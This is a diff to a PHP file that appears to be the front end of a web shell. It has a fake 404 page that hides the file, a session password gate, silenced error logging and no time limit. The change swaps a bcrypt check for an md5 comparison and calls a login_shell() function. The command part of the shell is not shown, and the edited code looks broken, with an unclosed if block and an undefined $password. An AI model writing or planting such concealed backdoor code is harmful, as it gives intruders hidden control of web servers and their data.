@@ -17,8 +17,8 @@ function show_404() {
         $tmp
     );
 
-    // Menampilkan pesan HTML 404 Not Found
-    echo <<<HTML
+?>
+
 <!DOCTYPE html>
 <html style="height:100%">
 <head>
@@ -45,22 +45,22 @@ function show_404() {
     </script>
 </body>
 </html>
-HTML;
 
+<?php
     exit;
 }
 
 if (!isset($_SESSION['authenticated'])) {
-    $stored_hashed_password = '$2y$10$ACTF7jbtyof6YoTCqitwLOxQ9II8xitPKC4pNi6SQjZM3HXkKiCZ.'; // Gunakan hash PASSWORD_DEFAULT, bisa menggunakan https://phppasswordhash.com/
+    $stored_hashed_password = '$2y$10$ACTF7jbtyof6YoTCqitwLOxQ9II8xitPKC4pNi6SQjZM3HXkKiCZ.'; // Use PASSWORD_DEFAULT hash you can use this site https://phppasswordhash.com/ for generating your password
 
-    if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
-        $_SESSION['authenticated'] = true;
+    if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
+    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
+        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
     } else {
-        show_404();
+        login_shell();
     }
 }
-?>
-<?php
+
 @set_time_limit(0);
 @clearstatcache();
 @ini_set('error_log', NULL);
